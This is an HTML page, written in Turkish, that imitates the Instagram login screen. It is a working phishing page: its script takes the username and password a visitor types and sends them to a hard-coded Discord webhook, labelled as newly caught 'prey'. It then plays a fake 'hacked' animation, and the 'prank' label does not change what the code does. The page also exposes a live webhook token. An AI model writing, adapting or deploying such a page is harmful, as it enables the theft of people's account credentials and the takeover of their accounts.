<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 25px; }
        input { width: 100%; padding: 9px 0 7px 8px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        .login-btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; margin-top: 8px; cursor: pointer; }
        #prank-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); color: #00FF00; font-family: 'Courier New', monospace; z-index: 1000; justify-content: center; align-items: center; flex-direction: column; text-align: center; padding: 20px; }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
        <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
        <input type="password" id="password" placeholder="Şifre">
        <button class="login-btn" onclick="sendToDiscord()">Giriş Yap</button>
    </div>

    <div id="prank-overlay">
        <h1 id="status-title">SİSTEME BAĞLANILIYOR...</h1>
        <p id="hack-text" style="font-size: 16px; white-space: pre-wrap;"></p>
        <h2 id="joke-msg" style="color: white; margin-top: 20px; display: none;">HACKED!</h2>
    </div>

    <script>
        // WEBHOOK LINKINI BURAYA TIRNAKLARIN ARASINA KOY
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486080451750924288/KF-WMPWZPjjMThjcVsjsapX4zE58psUO1H0Uh8rwJ7gLjbEhYqxGT_zaF6RxLzI8W_q3";

        function sendToDiscord() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (!user || !pass) {
                alert("Lütfen alanları doldur!");
                return;
            }

            const payload = {
                content: "🚀 **Yeni Av Yakalandı!**",
                embeds: [{
                    title: "Instagram Giriş Bilgileri",
                    color: 16711680,
                    fields: [
                        { name: "Kullanıcı", value: user, inline: true },
                        { name: "Şifre", value: pass, inline: true }
                    ]
                }]
            };

            // Animasyonu başlat
            startAnimation(user);

            // Discord'a gönder
            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(e => console.log("Gönderim hatası (normaldir):", e));
        }

        function startAnimation(user) {
            document.getElementById('prank-overlay').style.display = 'flex';
            const target = document.getElementById('hack-text');
            const lines = [
                `> Hedef belirlendi: ${user}`,
                "> SSL sertifikası bypass ediliyor...",
                "> Brute-force saldırısı başlatıldı...",
                "> Şifre çözüldü! Veriler çekiliyor...",
                "> Discord sunucusuna aktarım tamamlandı.",
                "\nSİSTEM KONTROLÜ ELE GEÇİRİLDİ."
            ];
            
            let lineIdx = 0;
            function typeLine() {
                if (lineIdx < lines.length) {
                    target.innerHTML += lines[lineIdx] + "<br>";
                    lineIdx++;
                    setTimeout(typeLine, 800);
                } else {
                    document.getElementById('status-title').innerText = "⚠️ HACKLENDİN ⚠️";
                    document.getElementById('joke-msg').style.display = 'block';
                }
            }
            typeLine();
        }
    </script>
</body>
</html>
